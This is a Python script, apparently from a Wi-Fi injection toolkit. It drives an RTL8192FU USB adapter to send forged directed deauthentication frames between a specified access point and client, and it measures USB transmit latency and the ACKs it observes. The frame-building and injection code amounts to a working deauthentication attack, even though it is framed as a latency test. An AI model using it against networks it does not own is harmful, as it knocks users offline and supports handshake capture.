"""Measure RTL8192FU TX submission latency and directed-deauth ACKs."""
from __future__ import annotations

import argparse
import asyncio
import sys
import time
from collections import defaultdict
from dataclasses import dataclass
from pathlib import Path
from statistics import median

import usb.core

REPO = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(REPO / "src"))

from wifit3.chips.rtl8192fu import SUPPORTED_IDS
from wifit3.chips.rtl8192fu.driver import RTL8192FUDriver
from wifit3.dot11 import build_deauth, str_to_mac
from wifit3.dot11.deauth import deauth_nav_bytes

USB_SLOW_SECONDS = 0.100


@dataclass(frozen=True)
class Observation:
    direction: str
    submit_seconds: float
    observed_acks: int


def _describe_direction(direction: str, observations: list[Observation]) -> str:
    submissions = [item.submit_seconds * 1000 for item in observations]
    ack_windows = sum(item.observed_acks > 0 for item in observations)
    repeated_ack_windows = sum(item.observed_acks > 1 for item in observations)
    observed_acks = sum(item.observed_acks for item in observations)
    return (
        f"{direction}: {len(observations)} submitted; "
        f"ACK in {ack_windows}/{len(observations)} windows; "
        f"{observed_acks} raw ACK frame(s), {repeated_ack_windows} window(s) with >1; "
        f"USB ms min/median/max={min(submissions):.1f}/{median(submissions):.1f}/{max(submissions):.1f}"
    )


async def run(
    channel: int,
    ap_bssid: str,
    client_mac: str,
    count: int,
    direction: str,
    dry_run: bool,
) -> int:
    ap = str_to_mac(ap_bssid)
    client = str_to_mac(client_mac)
    available_frames = {
        "ap-to-client": (
            "AP->client",
            build_deauth(client, ap, ap, 7, duration=deauth_nav_bytes(client_mac)),
            ap,
        ),
        "client-to-ap": (
            "client->AP",
            build_deauth(ap, client, ap, 7, duration=deauth_nav_bytes(ap_bssid)),
            client,
        ),
    }
    frames = tuple(available_frames.values()) if direction == "both" else (available_frames[direction],)
    if dry_run:
        print(f"would send {count} directed deauth round(s) on channel {channel} ({direction})")
        return 0

    device = usb.core.find(idVendor=0x2001, idProduct=0x3328)
    if device is None:
        print("RTL8192FU 2001:3328 not found; unplug, replug, and retry")
        return 1

    driver = RTL8192FUDriver.from_usb_device(device, SUPPORTED_IDS[0])
    connected = False
    observations: list[Observation] = []
    try:
        await driver.connect(lambda value, message: print(f"[{value:5.1%}] {message}"))
        connected = True
        await driver.set_channel(channel)
        await driver.enable_rx_acks()
        print(f"testing {count} directed deauth round(s) on channel {channel} ({direction})")
        print("ACK counts are raw RX observations, not per-packet TX status.")
        for attempt in range(1, count + 1):
            for label, frame, source_mac in frames:
                before = driver.acks_seen(source_mac)
                started = time.monotonic()
                await driver.inject_frame(frame)
                submitted = time.monotonic() - started
                await asyncio.sleep(driver.MAX_ACK_DELAY)
                acked = driver.acks_seen(source_mac) - before
                observations.append(Observation(label, submitted, acked))
                print(
                    f"{attempt:02d} {label:10s} USB submit={submitted * 1000:7.1f} ms "
                    f"ACKs={acked}"
                )
        return _report(observations)
    except Exception as error:
        print(f"FAIL: {type(error).__name__}: {error}")
        return 1
    finally:
        if connected:
            await driver.disable_rx_acks()
            await driver.close()


def _report(observations: list[Observation]) -> int:
    by_direction: dict[str, list[Observation]] = defaultdict(list)
    for observation in observations:
        by_direction[observation.direction].append(observation)
    slow = [item for item in observations if item.submit_seconds >= USB_SLOW_SECONDS]
    observed_acks = sum(item.observed_acks for item in observations)

    print(
        f"summary: {len(observations)} submitted frame(s), {observed_acks} raw ACK frame(s), "
        f"{len(slow)} USB submission(s) >= {USB_SLOW_SECONDS * 1000:.0f} ms"
    )
    for direction, direction_observations in by_direction.items():
        print(_describe_direction(direction, direction_observations))
    print("note: ACK control frames have no sequence number; they cannot prove a specific submission succeeded.")
    if slow:
        print("diagnosis: USB I/O slowdown or a stalled TX endpoint is present")
        return 2
    if not observed_acks:
        print("diagnosis: USB submission is fast; no raw recipient ACK reached this card's RX stream")
        return 3
    print("diagnosis: USB submission is fast; raw ACK reachability was observed in the listed directions")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Measure RTL8192FU USB TX latency and directed-deauth ACKs"
    )
    parser.add_argument("--channel", type=int, choices=range(1, 15), required=True)
    parser.add_argument("--ap-bssid", required=True)
    parser.add_argument("--client-mac", required=True)
    parser.add_argument("--count", type=int, default=10)
    parser.add_argument(
        "--direction",
        choices=("both", "ap-to-client", "client-to-ap"),
        default="both",
        help="send both directions or isolate one receiver path",
    )
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    if args.count < 1:
        parser.error("--count must be at least 1")
    return asyncio.run(
        run(args.channel, args.ap_bssid, args.client_mac, args.count, args.direction, args.dry_run)
    )


if __name__ == "__main__":
    raise SystemExit(main())
